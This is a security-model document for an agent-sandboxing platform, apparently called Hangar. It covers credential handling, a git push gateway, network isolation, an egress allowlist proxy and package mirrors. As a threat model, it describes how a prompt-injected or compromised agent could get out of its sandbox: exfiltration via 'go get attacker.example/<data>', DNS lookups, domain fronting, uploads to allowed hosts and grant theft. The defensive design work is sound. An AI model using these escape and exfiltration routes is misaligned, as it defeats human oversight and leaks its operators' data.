# Security model

Hangar exists to run untrusted, model-generated code. The design assumes any sandbox can be fully compromised by the agent inside it.

| Boundary | Mechanism |
| --- | --- |
| Sandbox ↔ host | runc (laptop, trusted use), gVisor user-space kernel, or Kata/Firecracker microVM with its own guest kernel |
| Sandbox ↔ sandbox | Separate containers/pods/VMs; no shared volumes; per-sandbox credentials |
| Sandbox ↔ network | GKE: `deploy/k8s/sandbox-network.yaml` (and Agent Sandbox's managed policy) deny RFC1918, link-local (metadata server) and all ingress. Docker: hangar's own network, where sandboxes can't reach each other ([below](#sandbox-networking-on-docker)); the single-VM install also drops what they send to link-local addresses. Environments in `allowlist` or `none` mode reach the internet only through hangar's [egress proxy](#egress-allowlists), by hostname |
| Client ↔ control plane | Bearer tokens (hashed at rest), single-use tickets for browser streams, TLS via ingress, optional IAP in front |
| Secrets | Fernet-encrypted vault, with a [rotatable key](#rotating-the-vault-key); never in images, API responses, MCP results, logs, or audit entries |

## Credential handling

- **Delivery.** Secrets are written into a running sandbox at claim time, to `~/.hangar/env` (mode 0600) or to the harness's own file. Sandbox images never contain them.
- **Forks.** A fork scrubs inherited secret files before re-injecting only the credentials it was granted.
- **Subscription logins are interactive-only.** An `oauth_token` or `auth_file` credential (Claude Pro or Max, a ChatGPT or Google sign-in) goes only into sandboxes and sessions a person starts for themselves, with a warning on the session, the sandbox and each turn's manifest. Every job's sandbox (every front door, best-of-N attempts, follow-ups, autofix, environment setup, the Cloud Doctor), schedules, webhooks, experiment trials and graders, and replay and fork sandboxes of them refuse one and use an API key: the vendors' terms don't allow automated use of consumer logins. `HANGAR_SUBSCRIPTION_LOGINS=any` relaxes this for jobs (warned, and `hangar doctor` fails), never for trials and graders. Spend limits on API keys are set at the vendor; hangar's budgets cap spend inside hangar ([team.md](team.md#subscription-logins)).
- **Exclusive credentials** are ones with rotating refresh tokens, like a Codex ChatGPT login. Each is leased to one sandbox. When that sandbox stops, the possibly rotated file is copied back into the vault.
- **Snapshots** of a running sandbox (Docker `commit`) may contain secrets that were present at snapshot time. They stay in the local image store and are never pushed.
- **Control-plane credentials never enter a sandbox.** Some credentials exist only for hangar itself: webhook signing keys (`webhook` credentials, the GitHub webhook secret, inbound webhook keys), the Slack bot token and signing secret, GitHub App keys, and the GitHub tokens hangar calls GitHub with (`HANGAR_GITHUB_TOKEN_CREDENTIAL`, `HANGAR_GATEWAY_CREDENTIAL`, `HANGAR_GITHUB_APP_CREDENTIAL`). Hangar refuses to put them in a sandbox by any path: an environment's `secrets:` (refused when the environment is saved, and again when a sandbox starts), an attached credential's env var or file, and so MCP config resolution, which only sees what those wrote. With the webhook secret anyone could forge trusted GitHub deliveries. `hangar cred ls` marks them `control-plane`. To share the control plane's GitHub token with direct-mode sandboxes on purpose, an admin runs `hangar cred exposure <name> sandbox`; signing keys, bot tokens and App keys can't be shared.
- **Exposure inside the sandbox.** Anything you inject is readable by the agent in that sandbox, and by any MCP client holding a hangar token (`exec`/`read_file` can read `~/.hangar/env`). Prefer scoped credentials: fine-grained GitHub tokens limited to the target repo, and API keys with spend limits. For git, use the [gateway](#git-credential-gateway): the token then never enters the sandbox.
- **Forks** run `tmux kill-server` before scrubbing secret files, so shells that exported the parent's secrets don't survive into the copy. A full memory snapshot (E2B) still carries any secrets held in other long-running processes' memory, so fork from a clean point when it matters.
- **Audit redaction.** Commands, prompts and terminal input are recorded in the audit log with stored credential values masked as `***`. Secrets that were never stored in the vault can't be recognized, so don't paste unrelated secrets into agent terminals. See [what redaction can and can't stop](#redaction).
- **Browser streams.** The dashboard never puts its token in a URL. Websocket terminals and build-log streams use single-use tickets that expire after 60 seconds.

## Git credential gateway

By default (`credential_mode: direct`) a sandbox gets the GitHub token itself, in `GH_TOKEN` and `~/.git-credentials`, and can push to any branch that token reaches. With the gateway, the token stays in the control plane:

- The sandbox gets a **grant**: an `hgs_…` token that works only at hangar's gateway, only for the sandbox's repo, and only while the sandbox runs. Hangar stores its hash; the token itself is written once, to the sandbox's `~/.git-credentials`.
- The sandbox's git is pointed at the gateway with `url.<gateway>/git/github.com/.insteadOf https://github.com/` (and the `git@github.com:` and `ssh://` forms). Clones, fetches and pushes keep working with the usual URLs.
- **What a grant may push depends on the sandbox** ([least privilege, below](#jobs-only-fetch-hangar-delivers)). A job's sandbox, a repo build's and env setup's validation get a **fetch-only** grant: hangar pushes a job's work itself. A session's sandbox (and one a person creates) gets a **branch-scoped** grant, because its agent is meant to push its own branch.
- The gateway reads each push's ref updates before any of the pack is forwarded. A branch-scoped grant allows only the sandbox's own branch (the session branch, or `work_branch`), plus *creating* new branches under `refs/heads/hangar/` (`HANGAR_GATEWAY_PUSH_REFS`); a branch a sandbox created that way becomes its own, and nobody else can update it. That rule never creates a branch under `hangar/session/`, another session's branch, or one that would block either. It refuses pushes to other branches, deletes, tags (`HANGAR_GATEWAY_ALLOW_TAGS`), push options and signed pushes. Git shows the reason: `! [remote rejected] main -> main (hangar: this sandbox may push only to hangar/job-…)`.
- **Every push is scanned for secrets before any of it goes upstream** ([below](#the-agents-own-pushes)). A hit refuses the push with the file and line, never the value.
- Allowed requests are streamed to GitHub with the real credential: a PAT from the vault, or a **GitHub App** installation token minted for that one repo with `contents: write` only (all a push needs), cached in memory until shortly before it expires.
- Pushes and refusals are in the audit log (`gw.git.push`, `gw.git.deny`) with the refs and the result. The grant is revoked when the sandbox is destroyed, expires or disappears; a fork gets its own grant.
- **The repo's REST API, read-only.** The same grant reads `GET /gh/api/repos/<owner>/<repo>/…` on the gateway (`ghapi.py`): PRs, review comments, issues, check runs and CI logs. Only the grant's own repository, only GET and HEAD. Upstream it uses an installation token that asks for read permissions only (or, if the App lacks one of them, the push token; the gateway lets only reads through either way). Redirects to CI logs and archives are followed by the gateway, only to GitHub's content hosts and Azure blob storage, without the token. In the sandbox, `HANGAR_GITHUB_API` names it and `~/.netrc` holds the grant for the gateway's host: `curl -sn "$HANGAR_GITHUB_API/repos/acme/app/pulls/12/comments"`.

The control plane's own GitHub calls don't go through the gateway: it opens and comments on agent PRs as the GitHub App when `HANGAR_GITHUB_APP_CREDENTIAL` is set, and comments on issues with `HANGAR_GITHUB_TOKEN_CREDENTIAL` ([landing.md](landing.md#what-each-identity-does)).

### Turning it on

1. Store the credential the gateway uses upstream. Either a fine-grained PAT limited to the repos agents work on (Contents read & write):

   ```sh
   hangar cred add github-pat --harness git --kind git_token --file ~/.hangar/gh-token
   ```

   or a GitHub App (recommended; see below).
2. Tell hangar where sandboxes reach the gateway, and which credential to use when an environment doesn't attach one:

   | Where | Settings |
   | --- | --- |
   | GKE | `HANGAR_GATEWAY_URL=http://hangar-gateway.hangar.svc:8788` (`deploy/k8s/gateway.yaml` adds the Service and the NetworkPolicy) |
   | Docker on a laptop | `HANGAR_GATEWAY_URL=http://host.docker.internal:8788` and `HANGAR_GATEWAY_HOST=172.17.0.1` (the docker bridge; `0.0.0.0` also works but listens on every interface) |
   | Both | `HANGAR_GATEWAY_CREDENTIAL=github-app` (optional when environments list a `git_token`/`github_app` credential) |

   The gateway listens on its own port (`HANGAR_GATEWAY_PORT`, default 8788) and serves nothing but `/git` and `/healthz`, so a network policy can let sandboxes reach it without reaching the API, dashboard or MCP endpoint. `HANGAR_GATEWAY_PORT=0` serves `/git` on the main port instead; then `/git` is reachable wherever the main port is (through your ingress, too), so a grant copied out of a sandbox works from there for as long as the sandbox lives.
3. Choose which sandboxes use it. With the gateway configured, **jobs, repo builds and env setup's validation always use it**, fetch-only, whatever their environment says, for every repo on a gateway host (`HANGAR_GATEWAY_UPSTREAMS`). **Sessions use it by default** (`HANGAR_GATEWAY_FOR_JOBS=true`, which now governs sessions only). For other sandboxes, or to opt a session environment out, set it on the environment:

   ```yaml
   name: api
   credential_mode: gateway   # or: direct
   credentials: [claude-api, github-app]
   repo: {url: https://github.com/me/api.git}
   ```

4. Run `hangar doctor`: it checks that the gateway answers and that every GitHub App credential can mint a token.

In gateway mode no git secret is written into the sandbox, by any path: `git_token` and `github_app` credentials are not injected, SSH keys are left out (with a warning), and an environment whose `secrets:` maps a git credential into an env var fails to start. A `github_app` credential is never injected in direct mode either. If an environment asks for the gateway and `HANGAR_GATEWAY_URL` isn't set, its sandboxes fail to start rather than fall back to the token.

What changes for agents: in a session, `git push` works for its own branch and fails with a clear message elsewhere; in a job, every push fails with `hangar: this sandbox may fetch but not push` (the job's instructions already say to commit and let hangar deliver). All github.com git traffic goes through the gateway, so fetching *other* repositories over git (a `git+https://github.com/...` dependency, a second clone) is refused; bake those into the image or vendor them.

**The trade-off for `gh`.** In gateway mode `gh` has no token and, in a proxied environment, no host: `github.com` and `api.github.com` aren't allowed hosts any more (the `packages` preset dropped `github`), since GitHub takes writes from anyone's token and so is a way out. `gh` can't be pointed at the gateway either: it speaks to an Enterprise host over HTTPS only. What an agent needs from GitHub it gets another way: hangar opens, comments on and lands PRs for jobs; the agent reads its repo's PRs, reviews, issues and CI through the read-only API above (`curl -sn "$HANGAR_GITHUB_API/…"`). An environment that wants `gh` with a token runs in `credential_mode: direct` with the `github` preset, and accepts that its agent can write anywhere that token reaches.

### Jobs only fetch; hangar delivers

A job's agent never needs to push: it commits and ends its turn, and hangar verifies, scans for secrets, runs the landing checks and pushes. So, following least privilege:

- **Every job's sandbox gets a fetch-only grant.** That is every kind of job: a plain job, its follow-ups and auto-fix rounds, each best-of-N attempt, env setup's goal and setup agents, and the Cloud Doctor's root-cause job (which reads untrusted evidence) and fix job. The gateway answers a fetch-only grant's push with `403` at its first request, before anything reaches GitHub, and audits it (`gw.git.deny`, `fetch-only grant`). No job kind needs a push grant.
- **Delivery pushes as hangar, after the checks.** Hangar mints a second grant for the sandbox, pinned to one ref (the job's branch, or an attempt's `<branch>-attempt-<n>`) and one commit (the head it checked), good for 10 minutes and dropped when the push ends (`gateway.grant`, `delivery: true`, with the commit). It runs `git push <commit>:<branch>` in the sandbox with that grant in an HTTP header for the gateway's URL only (from a 0600 file read and removed first, never a command line or `~/.git-credentials`), with the sandbox's hooks off. The gateway refuses anything else with it (another commit, another ref, a tag, a delete) and scans the pack like every push. Upstream the push is made with the gateway's credential (the GitHub App). A copy the agent lifts while the push runs can push only that commit to that branch, which hangar is doing anyway.
- **`credential_mode: direct` doesn't reopen it.** With the gateway configured, a job's sandbox is in gateway mode whatever its environment's `credential_mode` (or `HANGAR_GATEWAY_FOR_JOBS`) says, so no git credential is written into it; a git credential the environment's `secrets:` map is left out, with a warning on the sandbox. That holds for a job with no repo too, and for a repo on a host the gateway doesn't serve (`HANGAR_GATEWAY_UPSTREAMS`), which then gets no grant and no credential at all: a private repo there can't be cloned by a job. Without the gateway (`HANGAR_GATEWAY_URL` unset) a job's sandbox holds the environment's git token and can push wherever it reaches; consistently, landing never lands such a job ([landing.md](landing.md)) and `hangar doctor` warns (`landing: agent tokens`).
- **Grants from before.** At startup the gateway narrows every grant whose sandbox is a job's, a build's or a validation's to fetch-only (`gateway.narrow`; the token stays, so a job's sandbox kept for follow-ups across an upgrade keeps fetching), and drops delivery grants a restart cut short.
- **What the pin doesn't stop.** It names the commit, not the branch's value before it, and the gateway has no repository to tell a fast-forward from a force push. So an agent that lifts the grant while hangar's push runs could force-push that same commit over commits someone else added to the job's branch since (hangar's own push isn't forced, and fails then). Auto-fix already pauses when someone else pushed to the branch; branch protection on `hangar/**` that refuses force pushes closes it. The commit itself is named by the sandbox's git (`rev-parse`), like everything the in-sandbox checks see; the check the agent can't influence is the gateway's scan of the pack ([below](#the-agents-own-pushes)) and, for landing, GitHub's view of the PR.
- **Sessions keep a branch-scoped grant**, since pushing their own branch is what a session's agent is for. Their pushes are scanned in the gateway ([below](#the-agents-own-pushes)). To push from a job's work by hand, fork its session (`fork_session`): the fork is a session.
- **Repo builds and env setup's validation** run the repo's `install` (the validation's unmerged and agent-written). Their sandbox gets the fetch-only grant for its clone, the [build secrets](#build-secrets) an admin mapped (a build's only, in `install`'s environment), and egress per policy. Nothing else: no credential of the environment (no harness login, no `git_token`, no tool key), none of its `secrets:`, no OIDC cloud token. Without the gateway it gets no git credential at all, so a private repo's build fails and says why.

### Creating a GitHub App

1. GitHub → Settings → Developer settings → GitHub Apps → **New GitHub App** (under the organization if the repos are an org's).
2. Name it (e.g. `hangar-agents`), set any homepage URL, and turn **Webhook** off.
3. Repository permissions: **Contents: Read and write**, **Pull requests: Read and write** (Metadata: read is added automatically). Leave everything else, in particular **Workflows** and **Administration**, at *No access*: without Workflows, GitHub refuses pushes that change `.github/workflows/`.
4. Create it, note the **App ID**, then **Generate a private key** (a `.pem` file downloads).
5. **Install App** on only the repositories agents work on. The installation id is the number at the end of the installation's settings URL; it's optional (hangar looks it up per repo).
6. Store it without printing the key:

   ```sh
   jq -n --arg id 123456 --rawfile key ~/Downloads/hangar-agents.*.private-key.pem \
     '{app_id: $id, private_key: $key}' | hangar cred add github-app --harness git --kind github_app
   rm ~/Downloads/hangar-agents.*.private-key.pem
   ```

The push is made as the App; commits keep the agent's git identity. Set `HANGAR_GITHUB_APP_CREDENTIAL` to the same credential and the App also opens the jobs' PRs and lands them on approval; the gateway then uses it for sandboxes that have no git credential of their own, so `HANGAR_GATEWAY_CREDENTIAL` can stay unset ([landing.md](landing.md#1-the-github-app)).

### What the gateway does and doesn't cover

- It covers: a prompt-injected agent reading the GitHub token, pushing to `main` or another agent's branch, deleting branches, pushing tags, and using a dead sandbox's grant; and a job's agent (or a build's `install`) pushing anything at all, so `push`-triggered workflows never run on a branch an agent pushed by itself. Grant tokens are bound to one sandbox, stored hashed, compared in constant time, and never accepted by the main API; hangar API tokens are never accepted by the gateway.
- It covers secrets in what the agent pushes, as far as the [push scan](#the-agents-own-pushes) recognizes them.
- It doesn't cover: what else is *in* the pushed branch (review the PR; keep secrets out of `push`-triggered workflows), egress filtering (that is the environment's `egress` mode, [egress allowlists](#egress-allowlists)), or the model credential, which is still injected.
- Force pushes to the sandbox's own branch are allowed (agents rebase); force pushes anywhere else are refused like any other update. Keep branch protection on `main` as a second wall.
- Inside the cluster the gateway speaks plain HTTP, so the grant crosses the pod network unencrypted. It is worth little: it dies with the sandbox and reaches one branch of one repo.

## Sandbox networking on Docker

On Docker's default bridge every container reaches every port of every other: hangar-envd, dev servers, anything an agent listens on. Hangar creates its own network for sandboxes instead, `hangar-sandboxes` on the bridge `hangar0`, with inter-container connectivity off (`com.docker.network.bridge.enable_icc=false`), and starts every sandbox and warm-pool container on it. Checked on Docker 29.8 (`tests/test_e2e_isolation_docker.py`):

- one sandbox can't connect to another's ports, envd's included;
- the host still reaches each sandbox at its IP, and at envd's port published on `127.0.0.1` (only the host can use that address; a sandbox that dials the host's bridge address gets nothing);
- sandboxes still reach the internet, and the host at `host.docker.internal`, where the [git gateway](#git-credential-gateway) listens;
- a container attached to the network can't reach the sandboxes either, so a control plane that runs in a container (Docker Compose) reaches envd only through `docker exec`.

`HANGAR_DOCKER_NETWORK` names another network to use as it is (`bridge` for Docker's default). `hangar doctor` warns when that network lets sandboxes reach each other, and lists sandboxes started before this change, which stay where they are until they are recreated.

Docker has no setting that keeps containers off link-local addresses, so on a cloud VM a sandbox can ask the metadata server for the VM's credentials unless the host's firewall drops it. The bridge has a fixed name for that rule (the single-VM install adds it on every boot; DNS stays open because Docker's resolver may forward to the same address):

```sh
iptables -I DOCKER-USER -i hangar0 -d 169.254.0.0/16 -p tcp ! --dport 53 -j DROP
```

A sandbox with [services](environments.md#services) (Postgres, Redis) is also attached to a network of its own, `hangar-svc-<sandbox>`, which holds only its services. The network is `internal`: it has no route out, so the services can't reach the internet, the host or the metadata server, and nobody else's sandbox is on it. The services run as uid 1000, without capabilities, with `no-new-privileges`, under the sandbox's runtime. [Preview ports](environments.md#preview-ports) go through hangar's authenticated proxy, owner-scoped, and are never published on the host.

## Egress allowlists

An environment says what its sandboxes may reach on the internet, by hostname:

```yaml
name: api
egress:
  mode: allowlist            # open | allowlist | none
  presets: [pypi, npm]       # default [packages]: pypi, npm, crates and go
  allow: [docs.python.org, "*.internal.example.com", "registry.example.com:8443"]
```

| Mode | Network | What gets through |
| --- | --- | --- |
| `open` (`HANGAR_EGRESS_DEFAULT`'s default for people's own work; never for an [intake job](#intake-posture) under `enforce`) | the public internet directly, as before | everything public |
| `allowlist` | only the git gateway and hangar's egress proxy (no DNS) | the harness's own hosts (its model API and login refresh), the environment's remote MCP servers, the presets, `allow`, and hosts an owner approved |
| `none` | the same | the harness's own hosts, the environment's MCP servers and approved hosts only |

A rule is a host (`pypi.org`, ports 443 and 80), a host and port, or `*.domain` (any name below it, not the domain itself). There is no `*` rule: that is mode `open`.

- **Presets** (`egress.PRESETS`): `pypi`, `npm` and `go` are served by hangar's [read-only package mirror](#package-mirrors) when the git gateway is configured, and their registries' own hosts stay closed. Without the gateway they open pypi.org and files.pythonhosted.org, registry.npmjs.org, and proxy.golang.org and sum.golang.org, and the sandbox carries a warning that those hosts also take uploads. `crates` opens index.crates.io and static.crates.io, the read-only sparse index and download host; not crates.io, the API that takes `cargo publish`. `packages` is those four. `github` (github.com, api.github.com, codeload.github.com, objects/release-assets/raw.githubusercontent.com) is no longer part of `packages`: GitHub takes writes with anyone's token, and gateway-mode sandboxes reach their repo through the [gateway](#git-credential-gateway) instead. Name it on its own for an environment that needs it.
- **The harness's hosts** are always allowed in a proxied mode, since an agent can't work without its model: Claude Code's are `api.anthropic.com`, `claude.ai` and `platform.claude.com` ([Claude Code's network requirements](https://code.claude.com/docs/en/network-config#network-access-requirements)); Codex's `api.openai.com`, `chatgpt.com` and `auth.openai.com`; Gemini and Antigravity's `generativelanguage.googleapis.com`, `cloudcode-pa.googleapis.com` and `oauth2.googleapis.com`. A pi router not among them goes in `allow`.
- **Per repo.** A repo policy's `egress` (`PUT /api/repos/policy`, admin) adds presets and hosts for that repo's sandboxes and can tighten the mode (`open` < `allowlist` < `none`). It can't widen it. A repo policy that asks for `allowlist` in an `open` environment isn't enforced, because the network decides that; the sandbox carries a warning saying so.
- **Who sets it.** `egress` on an environment needs an admin, like `secrets:` and `image`.
- **Git.** Clones and pushes to GitHub go through the [git gateway](#git-credential-gateway), which jobs and sessions use by default, and so does reading the repo's API. The gateway is reachable in every mode, so they need no rule. A `credential_mode: direct` environment clones from github.com itself through the proxy, which needs the `github` preset named on its own; in mode `none` its clone fails.
- **Asking for a host.** The agent runs `hangar-agent env request egress <host> --why '…'`, and the proxy's refusal says exactly that. The session's or job's owner, or an admin, approves or denies the request. An approval adds the host to that session's allowlist; an admin can widen it to the whole environment. It applies to the next connection, and is audited as `egress.approve`. Nothing is granted automatically. Admins list approvals with `GET /api/egress/approvals?environment=…` (or `session=…`) and revoke one with `DELETE` and `rule=` (audited as `egress.revoke`). `GET /api/egress/sandboxes/<id>` shows what a sandbox may reach and why.

**How it is enforced.** An environment's mode decides the network its sandboxes start on:

- **GKE.** Pods of a proxied environment carry `dev.hangar/egress=proxied`. `sandbox-network.yaml`'s internet baseline leaves them out. `gateway.yaml`'s `sandbox-egress-proxied` gives them the proxy on hangar's pods (port 3128, `HANGAR_EGRESS_URL=http://hangar-gateway.hangar.svc:3128`), and `allow-hangar-gateway` gives them the git gateway. They get no DNS: kube-dns resolves any name by asking the internet, so a sandbox that may query it can send data out in the names it looks up. Their pods' resolver is loopback (`dnsPolicy: None`), and hangar's own Service names (the proxy, the git gateway, an in-cluster `HANGAR_OTEL_SANDBOX_ENDPOINT`) are in `/etc/hosts`, resolved by the control plane when it writes the template. Tools hand the proxy a host name, so they need no resolver of their own. Their SandboxTemplate carries the same rules as its `networkPolicy`, so Agent Sandbox applies that policy instead of its default one, which allows the public internet. The template stays `Managed`.
- **Docker.** Their containers go on `hangar-egress` (bridge `hangar1`), an *internal* network: Docker gives it no route out, but its gateway address reaches the host. Hangar listens there with the proxy and relays the git gateway's port; `host.docker.internal` points at that address in those containers. DNS on an internal network answers container names only, from Docker 26.0.0 (and 25.0.4, 23.0.11); older engines forward it to the host's resolver (CVE-2024-29018), so hangar refuses to start a proxied sandbox on them. This needs hangar on the Docker host (Linux). Docker Desktop's VM has that address and the Mac doesn't, so a proxied sandbox fails to start there with a message that says so; keep `open` for local work. A host firewall that drops input (ufw's default) must accept TCP 3128 and 8788 from `hangar1`.
- **E2B and other providers** can't keep a sandbox off the internet, so a proxied environment fails to start there rather than run unenforced.

**The proxy** is part of the control plane, next to the git gateway (`egress_proxy.py`). It is an HTTP CONNECT proxy that never terminates TLS. For each connection it:

1. authenticates the sandbox. HTTPS_PROXY carries `<sandbox id>:<HMAC(vault key, sandbox id)>`; the value is never stored and is refused once the sandbox isn't running. 30 bad credentials a minute from one address are refused without a check;
2. checks host and port against the sandbox's policy: its environment, its repo's policy and its session's approvals, cached for 5 seconds;
3. resolves the name itself and connects only to public addresses, to the address it checked. A name that resolves into the VPC, the cluster, loopback or the metadata server is refused. `HANGAR_EGRESS_PRIVATE_HOSTS` lists internal mirrors that may resolve to private addresses, but never to loopback or link-local ones;
4. reads the client's first bytes before relaying any of them: a whole TLS ClientHello, or a plain HTTP request head, which must carry the host in `Host`. Anything else is cut off. The hello is parsed strictly (`egress_tls.py`):
   - exactly one `server_name` extension holding one `host_name` (RFC 6066 allows no more), and it must be the CONNECT host. A hello without SNI passes only when the CONNECT target is an IP address;
   - no Encrypted ClientHello: a hello carrying `encrypted_client_hello` (0xfe0d, [RFC 9849](https://www.rfc-editor.org/rfc/rfc9849.html) §5), `ech_outer_extensions` (0xfd00, §5.1) or draft ESNI's `encrypted_server_name` (0xffce) is refused, since its SNI in clear names the front end, not the site. GREASE ECH (§6.2) looks the same and is refused too, so hangar's computer image turns ECH off in Chromium (the `EncryptedClientHelloEnabled` policy, and `--disable-features=EncryptedClientHello` where hangar launches it). curl, Python, Node and Go don't send ECH unless asked;
   - nothing that hides or blurs the name: SSL 2.0-style and SSL 3.0 hellos (no extensions), an extension sent twice ([RFC 8446](https://www.rfc-editor.org/rfc/rfc8446.html) §4.2 forbids it, and a server might read the other copy), a hello whose extensions don't parse, and a second handshake message in the first flight. A hello split over several records is reassembled (up to 64 KB);
   - after a HelloRetryRequest the client sends a second hello in clear; it gets the same checks before it goes upstream, so a first hello without ECH can't be followed by one with it.

   Absolute-form `http://` requests are forwarded one per connection, without `Proxy-Authorization`;
5. relays bytes both ways until a side closes or nothing moves for 15 minutes. A sandbox has at most `HANGAR_EGRESS_MAX_CONNECTIONS_PER_SANDBOX` (128) tunnels open, and all of one person's sandboxes together at most `HANGAR_EGRESS_MAX_CONNECTIONS_PER_PERSON` (640), so six people at their caps fit the proxy's 4096. A tunnel whose client stops reading holds at most about 320 KB of the proxy's memory. On shutdown the proxy takes no new connection from the signal on, and open tunnels (a model's stream mid-answer) get `HANGAR_EGRESS_DRAIN_SECONDS` (20, inside the pod's 45-second grace) to finish.

Why there and not a separate proxy: the decision needs the sandbox, its person, its session's approvals and the audit log, all of which live in the control plane. A connection costs one SQLite read by primary key, and relaying is socket copying with 64 KB reads. An off-the-shelf proxy (Smokescreen, Squid) would need per-sandbox roles, a way to receive approvals live, and its logs mapped back to people. A Rust proxy in `envd/`'s workspace would need the same policy over an API. The relay is the part to move out if a profile ever shows it costing the control plane.

**What is recorded.** Every denied connection is an `egress.deny` audit entry with the sandbox, person, environment, session, job, host, port and reason. A sandbox gets at most 30 a minute; the next entry records how many were dropped (`suppressed_before`). It also appears in the events of the sandbox's session. Allowed connections are summed per sandbox and host into `egress.allow` entries every minute: connections, bytes out and in, and the rule that allowed them. Metrics: `hangar_egress_connections{decision,reason,mode}`, `hangar_egress_bytes{direction}`, `hangar_egress_open_connections`.

Remote MCP servers count toward the allowlist only when someone who may widen egress configured them: in an environment that sets `egress`, or one an admin owns; a member's environment that adds or repoints one gets a warning instead. Tools that ignore `HTTPS_PROXY` (some JVM builds, raw sockets) simply fail in a proxied environment.

### Package mirrors

A host that serves packages usually takes uploads too: `npm publish` goes to registry.npmjs.org itself, `cargo publish` to crates.io, and pypi.org's web forms change an account's data. With an attacker's own token, each is a way out. So in a proxied environment with the git gateway configured, hangar doesn't open those hosts for the `pypi`, `npm` and `go` presets. It points the sandbox's package managers at `/pkg/<ecosystem>/` on the gateway's port, which every proxied sandbox reaches (`pkgmirror.py`):

- **Read-only by construction.** GET and HEAD only, below the configured upstream only, and without the client's credentials, cookies or headers. There is no path from a sandbox to a publish endpoint and nothing to log in to; a write gets a 405 and an `egress.deny`.
- **Upstreams.** The public registries by default (PyPI and its file host, npm, the Go module proxy and checksum database), with a disk cache of immutable files (wheels and sdists, npm tarballs, Go module zips) of `HANGAR_PACKAGE_MIRROR_CACHE_MB` (1024), least recently used first. On GKE, point `HANGAR_PACKAGE_MIRRORS` at [Artifact Registry remote repositories](https://docs.cloud.google.com/artifact-registry/docs/repositories/remote-overview), pull-through caches for PyPI, npm and Go (among others) that can't be published to: `{"pypi": "https://us-python.pkg.dev/PROJECT/pypi-remote", "npm": "https://us-npm.pkg.dev/PROJECT/npm-remote"}` (Go stays on the public proxy: see **Go** below). Hangar reads them with its own Google credentials (Workload Identity; `roles/artifactregistry.reader` on the repositories): Basic `oauth2accesstoken` for Python and Go, a bearer token for npm. Sandboxes never get `*.pkg.dev` as a host: it serves every project's repositories, an attacker's writable ones included.
- **What sandboxes are told.** `PIP_INDEX_URL`, `PIP_TRUSTED_HOST`, `UV_DEFAULT_INDEX`, `NPM_CONFIG_REGISTRY` with the credential in `~/.npmrc` (npm takes registry credentials only from its config), yarn's `YARN_NPM_*`, and `GOPROXY` (with the checksum database proxied through it). The credential is the sandbox's egress-proxy credential; its git grant works too. An environment's own `env` wins over these. Tools that read none of them (Poetry's own sources, conda, Maven) reach the public hosts and are refused, with the usual request hint.
- **Go.** A module path names its origin, and proxy.golang.org fetches a module it hasn't seen from there, so `go get attacker.example/<data>` would carry data to the attacker through an allowed host. The mirror asks with `Disable-Module-Fetch: true` (the proxy then serves only modules it has cached, as [pkgsite's proxy client](https://pkg.go.dev/golang.org/x/pkgsite/internal/proxy) documents), and lets a checksum-database lookup through only for a version the proxy already has. A module version nobody has fetched before isn't available; vendor it or approve `proxy.golang.org`. An Artifact Registry Go upstream fetches what it doesn't have from proxy.golang.org, which may fetch from the origin: keep the public proxy for Go where that matters.
- **Who.** Each ecosystem is served only to sandboxes whose policy has its preset (or `packages`). Use is summed per sandbox into the `egress.allow` entries like proxied traffic (host `<ecosystem>.mirror.hangar`).
- **Cargo** has no mirror: the `crates` preset opens only the sparse index and the download host, which serve files, and not crates.io's API.

### What egress doesn't stop

The allowlist narrows where data can go and records who sent how much where. It doesn't make an allowed host safe:

- **Anything sent to an allowed host.** A URL or a body to any allowed host can carry data. That includes the harness's own model API with a key the attacker brings (it is always allowed), hosts in `allow`, approved hosts, the environment's MCP servers, and the cloud token exchange. Prefer exact hosts to wildcards: `*.googleapis.com` includes `storage.googleapis.com`, where anyone can write to their own bucket.
- **Another site on an allowed host's front end.** Without TLS interception the proxy pins the address and checks the SNI, but can't see inside TLS. A `Host` header or HTTP/2 `:authority` that names another customer of the same CDN reaches that site wherever the CDN doesn't check it against the SNI (domain fronting). Where the major CDNs stand (checked 2026-10-14):

  | CDN | Fronting between customers |
  | --- | --- |
  | Google | Blocked since April 2018 ([The Register](https://www.theregister.com/2018/04/19/google_domain_fronting/)). |
  | Amazon CloudFront | Blocked since April 2018: the certificate's account must own the request's distribution, else 421 ([AWS](https://aws.amazon.com/blogs/security/enhanced-domain-protections-for-amazon-cloudfront-requests)). |
  | Cloudflare | SNI and `Host` must match, else 421 ([Cloudflare](https://developers.cloudflare.com/support/troubleshooting/http-status-codes/4xx-client-error/error-421/)). It does coalesce HTTP/2 and HTTP/3 connections across hostnames one certificate covers. ECH would have hidden the real name: it is refused now. |
  | Azure Front Door, Azure CDN (classic) | Blocked unless both names are in the same Azure subscription, 421 otherwise: new resources from November 2022, enabled globally from 8 January 2024 ([Microsoft](https://learn.microsoft.com/en-us/answers/questions/1461316/take-action-to-stop-domain-fronting)). |
  | Fastly | Announced a block from 27 February 2024 ([Risky Business](https://www.risky.biz/fastly-to-block-domain-fronting-in-2024/)), yet a March 2025 test still fronted through it ([Compass Security](https://blog.compass-security.com/2025/03/bypassing-web-filters-part-3-domain-fronting/)). Treat it as open. |
  | Akamai | Found susceptible, with 21 other CDNs of 30, in a 2023 measurement ([arXiv:2310.17851](https://arxiv.org/abs/2310.17851)). Treat it as open. |

  So an allowed host on Fastly or Akamai can reach any other site there. PyPI is on Fastly: with the package mirror on, sandboxes don't reach PyPI's hosts at all, but without the gateway (the `pypi` preset opens them) they do. Look up where a host in `allow` is served before adding it. TLS 1.2 renegotiation sends a new hello encrypted, out of the proxy's sight; the large CDNs don't accept client-initiated renegotiation.
- **Low-bandwidth channels through what is allowed:** which packages and versions a sandbox downloads shows in a registry's public download statistics, and the mirror's cache hides repeats but not first fetches.
- **`github` named as a preset** (direct-mode environments) is GitHub with whatever token the agent has or brings.

## Secret scanning

Before hangar pushes a job's branch it scans what would leave:

- each new commit's own patch, since `git push` sends every commit: a token one commit adds and a later one deletes still leaves, so the net diff since the base isn't enough. Commits the remote already has don't count;
- the uncommitted change and untracked-but-not-ignored files (what hangar would commit). Added lines only;
- the new commits' messages.

What counts as a secret:

- any stored credential's value, as is or encoded ([redaction](#redaction));
